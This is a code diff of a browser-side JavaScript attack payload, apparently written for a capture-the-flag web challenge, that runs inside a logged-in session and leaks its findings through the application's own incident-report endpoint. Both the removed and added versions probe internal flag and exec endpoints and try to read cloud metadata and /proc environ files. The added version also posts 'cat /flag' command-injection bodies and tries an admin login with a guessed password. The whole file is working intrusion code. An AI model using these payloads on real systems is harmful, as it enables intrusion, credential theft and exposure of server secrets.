@@ -1,6 +1,6 @@
-// Probe internal service at web:3000
+// P8: Internal audit access + broader endpoint scan + password test
 (async () => {
-  var O = self.location.origin; // http://web:3000
+  var O = self.location.origin;
   var P = function(t) {
     return fetch(O + '/api/incidents', {
       method: 'POST', credentials: 'same-origin',
@@ -9,83 +9,88 @@
     }).catch(function() {});
   };
 
-  await P('P7|START|' + O);
+  await P('P8|START');
 
-  // Try internal flag endpoints
-  var urls = [
-    O + '/flag',
-    O + '/flag.txt',
-    O + '/api/flag',
-    O + '/api/cat',
-    O + '/api/admin/flag',
-    O + '/api/admin/cat',
-    O + '/api/pwned',
-    O + '/cat',
-    'http://web:3000/flag',
-    'http://web:3000/api/flag',
-    'http://web:3000/cat',
-    'http://flag:3000/',
-    'http://flag/',
-  ];
-
-  for (var i = 0; i < urls.length; i++) {
-    try {
-      var r = await fetch(urls[i], {credentials: 'same-origin'});
-      var t = await r.text();
-      await P('P7|URL|' + urls[i].replace(O,'') + '|' + r.status + '|' + t.slice(0, 55));
-    } catch(e) {
-      await P('P7|ERR|' + urls[i].replace(O,'') + '|' + String(e).slice(0, 55));
-    }
-  }
-
-  // Try login as admin with Summer2025! from INSIDE the network
+  // 1. Can developer read audit internally?
   try {
-    var lr = await fetch(O + '/api/auth/login', {
-      method: 'POST', credentials: 'same-origin',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({email: 'admin@aegiscore-response.com', password: 'Summer2025!'})
-    });
-    var lj = await lr.json();
-    await P('P7|ADM|' + lr.status + '|' + JSON.stringify(lj).slice(0, 70));
-  } catch(e) { await P('P7|ADMERR|' + e); }
+    var r = await fetch(O + '/api/admin/audit?log=2', {credentials: 'same-origin'});
+    var t = await r.text();
+    await P('P8|AUD|' + r.status + '|' + t.slice(0, 70));
+  } catch(e) { await P('P8|AUDERR|' + String(e).slice(0, 60)); }
 
-  // Read fresh audit entry 2 directly
+  // 2. Can developer read audit without /admin/ prefix?
   try {
-    var ar = await fetch(O + '/api/admin/audit?log=2', {credentials: 'same-origin'});
-    var at = await ar.text();
-    await P('P7|AUD2|' + ar.status + '|' + at.slice(0, 70));
-    // If we can read it (developer might access internally), dump the body
-    if (ar.status === 200 || at.indexOf('request_dump') > -1) {
-      var n = Math.ceil(at.length / 80);
-      for (var c = 0; c < n && c < 20; c++) {
-        await P('P7|AD|' + (c+1) + '/' + n + '|' + at.slice(c*80, (c+1)*80));
-      }
-    }
+    var r = await fetch(O + '/api/audit?log=2', {credentials: 'same-origin'});
+    await P('P8|AUD2|' + r.status + '|' + (await r.text()).slice(0, 70));
   } catch(e) {}
 
-  // Try accessing internal docker/kubernetes metadata
-  var meta = [
-    'http://169.254.169.254/latest/meta-data/',
-    'http://metadata.google.internal/computeMetadata/v1/',
+  // 3. Try developer-specific audit
+  try {
+    var r = await fetch(O + '/api/developer/audit', {credentials: 'same-origin'});
+    await P('P8|DAUD|' + r.status + '|' + (await r.text()).slice(0, 70));
+  } catch(e) {}
+
+  // 4. Broad scan for any endpoint with flag/cat/exec
+  var eps = [
+    '/api/exec', '/api/run', '/api/shell', '/api/command',
+    '/api/system', '/api/system/exec', '/api/system/flag',
+    '/api/debug', '/api/internal', '/api/internal/flag',
+    '/api/developer/exec', '/api/developer/run',
+    '/api/developer/command', '/api/developer/shell',
+    '/api/developer/cat', '/api/developer/system',
+    '/api/developer/flag', '/api/developer/eval',
+    '/api/developer/probe', '/api/developer/diag',
+    '/api/config', '/api/env', '/api/settings',
+    '/internal', '/internal/flag', '/debug', '/debug/flag',
+    '/healthz', '/metrics', '/env', '/info',
+    '/api/incidents/export', '/api/diagnostic',
   ];
-  for (var m = 0; m < meta.length; m++) {
+  for (var i = 0; i < eps.length; i++) {
     try {
-      var r = await fetch(meta[m]);
-      await P('P7|META|' + r.status + '|' + (await r.text()).slice(0, 60));
+      var r = await fetch(O + eps[i], {credentials: 'same-origin'});
+      if (r.status !== 404) {
+        var t = await r.text();
+        await P('P8|EP|' + eps[i] + '|' + r.status + '|' + t.slice(0, 45));
+      }
     } catch(e) {}
   }
 
-  // env vars via /proc
-  try {
-    var r = await fetch('file:///proc/self/environ');
-    await P('P7|ENV|' + r.status + '|' + (await r.text()).slice(0, 60));
-  } catch(e) { await P('P7|ENVF|' + String(e).slice(0, 60)); }
+  // 5. POST endpoints
+  var peps = ['/api/exec', '/api/developer/exec', '/api/developer/run',
+              '/api/developer/eval', '/api/developer/command'];
+  for (var j = 0; j < peps.length; j++) {
+    try {
+      var r = await fetch(O + peps[j], {
+        method: 'POST', credentials: 'same-origin',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({cmd: 'cat /flag', command: 'cat /flag', input: 'cat /flag'})
+      });
+      if (r.status !== 404) {
+        await P('P8|POST|' + peps[j] + '|' + r.status + '|' + (await r.text()).slice(0, 45));
+      }
+    } catch(e) {}
+  }
 
-  // Try /flag file
+  // 6. Try login as admin with Summer2025! (separate session via no-credentials)
   try {
-    var r = await fetch('file:///flag');
-    await P('P7|FILE|' + r.status + '|' + (await r.text()).slice(0, 60));
-  } catch(e) { await P('P7|FILEF|' + String(e).slice(0, 60)); }
+    var r = await fetch(O + '/api/auth/login', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({email: 'admin@aegiscore-response.com', password: 'Summer2025!'})
+    });
+    var j = await r.json();
+    await P('P8|ADMLOG|' + r.status + '|' + JSON.stringify(j).slice(0, 65));
+  } catch(e) { await P('P8|ADMLERR|' + String(e).slice(0, 60)); }
 
-  await P('P7|DONE');
+  // 7. Try reading /proc/1/cmdline and /proc/1/environ via fetch
+  for (var path of ['/proc/1/cmdline', '/proc/self/environ', '/etc/hostname', '/flag']) {
+    try {
+      var r = await fetch('file://' + path);
+      await P('P8|FILE|' + path + '|' + r.status + '|' + (await r.text()).slice(0, 50));
+    } catch(e) {
+      await P('P8|FILEF|' + path + '|' + String(e).slice(0, 50));
+    }
+  }
+
+  await P('P8|DONE');
 })();
